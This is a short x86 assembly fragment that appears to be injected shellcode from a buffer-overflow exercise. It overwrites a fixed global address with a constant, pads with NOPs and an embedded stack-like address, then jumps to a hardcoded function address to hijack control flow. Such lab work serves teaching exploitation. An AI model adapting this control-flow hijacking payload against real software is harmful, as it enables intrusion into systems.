movl $0x0804a1dc, %eax
movl $0x76db18e9, (%eax)
jmp .L
nop
nop
nop
.long 0xffffb16c
.L:
movl $0x08048d60, %ebx
jmp *%ebx
